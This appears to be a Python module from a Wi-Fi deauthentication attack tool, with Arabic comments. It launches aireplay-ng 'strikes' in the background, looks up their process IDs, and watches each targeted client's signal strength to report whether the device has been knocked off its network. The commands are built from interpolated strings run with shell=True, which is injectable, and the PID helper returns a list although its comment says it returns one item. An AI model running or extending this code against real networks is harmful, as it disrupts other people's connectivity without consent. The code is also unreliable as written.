#!/usr/bin/env python3
import subprocess
import time

class StrikeSmartFire:
    @staticmethod
    def fire_and_get_pid(strike_cmd, client, target_socket):
        """إشعال القذيفة محلياً واصطياد الـ PID الصافي كنص String صافٍ لمنع الـ TypeError لطلبك"""
        try:
            subprocess.Popen(f"nohup {strike_cmd} >/dev/null 2>&1 &", shell=True)
            time.sleep(0.2)
            res = subprocess.check_output(f"pgrep -f 'aireplay-ng .* -c {client} {target_socket}' || echo ''", shell=True)
            lines = [l.strip() for l in res.decode().split('\n') if l.strip()]
            # [قفل أمان الـ PID النصي الموحد]: سحب العنصر الأول لمنع تمرير المصفوفات بقواذف الباش
            return lines if lines else "N/A"
        except Exception: return "N/A"

    @staticmethod
    def verify_potency(stations, active_strikes):
        """[فاحص الفاعلية المحمي]: مراقبة الـ Power اللحظي وسحق عيوب الـ ValueError المنطقية لطلبك"""
        try:
            p_map = {s["client"]: s["power"] for s in stations}
            for num, s in active_strikes.items():
                client = s["client"]
                if client in p_map:
                    raw_p = str(p_map[client]).replace("-","").strip()
                    p = int(raw_p) if raw_p.isdigit() else 99
                    if p >= 85 or p == 0:
                        s["status"] = "🎯 تم التعطيل والفرز العتادي (Signal Dropped)"
                    else:
                        s["status"] = f"يتم قذفه حياً 🚀 (-{p} dBm)"
                else: s["status"] = "💤 العميل انقطع الربط وغادر النطاق"
        except Exception: pass
        return active_strikes
